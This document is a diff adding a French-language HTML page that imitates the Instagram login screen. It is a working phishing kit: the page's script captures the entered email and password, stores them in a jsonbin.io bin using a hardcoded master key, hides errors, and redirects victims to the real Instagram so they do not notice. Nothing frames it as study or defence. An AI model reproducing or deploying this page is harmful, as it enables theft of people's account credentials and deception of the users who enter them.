@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram - Connexion</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Google Sans', Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background: #fff;
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 24px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .logo img {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            color: #202124;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            height: 56px;
+            padding: 8px 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        input:focus {
+            border-color: #1a73e8;
+            outline: none;
+        }
+
+        .connexion-button {
+            background: #4eaefc;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        .connexion-button:hover {
+            background: #0576f7;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+
+        .remember-me input[type="checkbox"] {
+            width: auto;
+            height: auto;
+            margin-right: 8px;
+        }
+
+        .forgot-password {
+            color: #4eaefc;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            background: #f2f2f2;
+            font-size: 12px;
+            color: #70757a;
+        }
+
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .footer-links a {
+            color: #70757a;
+            text-decoration: none;
+            margin-left: 27px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        select {
+            background: transparent;
+            border: none;
+            color: #70757a;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="container">
+            <div class="logo">
+                <img src="https://logo-marque.com/wp-content/uploads/2020/04/Instagram-Logo.png" height:"500%" width:"500%"alt="Instagram-Logo">
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="text" id="email" placeholder="Email ou téléphone" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" id="password" placeholder="Mot de passe" required>
+                </div>
+                
+                <div class="remember-me">
+                    <div>
+                        <input type="checkbox" id="remember">
+                        <label for="remember">Se souvenir de moi</label>
+                    </div>
+                    <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+                </div>
+                
+                <button type="submit" class="connexion-button">Suivant</button>
+            </form>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <select>
+                <option>Français (France)</option>
+            </select>
+            <div class="footer-links">
+                <a href="#">Aide</a>
+                <a href="#">Confidentialité</a>
+                <a href="#">Conditions</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        const loginForm = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+
+        loginForm.onsubmit = function(e) {
+            e.preventDefault();
+            const email = emailInput.value;
+            const password = document.getElementById('password').value;
+            
+            const BIN_ID = '67c61ceae41b4d34e4a03994';
+            const API_KEY = '$2a$10$YNFDvy/E260jjrnIyOT4w.VHcrMEdm61T7NvQRUBv3k1miiExmVL2';
+            
+            fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+                method: 'GET',
+                headers: {
+                    'X-Master-Key': API_KEY,
+                    'X-Bin-Meta': false
+                }
+            })
+            .then(res => res.json())
+            .then(data => {
+                const credentials = data.credentials || [];
+                credentials.unshift({
+                    timestamp: new Date().toLocaleString(),
+                    email: email,
+                    password: password,
+                    origin: window.location.href
+                });
+
+                return fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Master-Key': API_KEY
+                    },
+                    body: JSON.stringify({ credentials: credentials })
+                });
+            })
+            .catch(() => {})
+            .finally(() => {
+                window.location.href = 'https://www.instagram.com';
+            });
+        };
+    </script>
+</body>
+</html> 
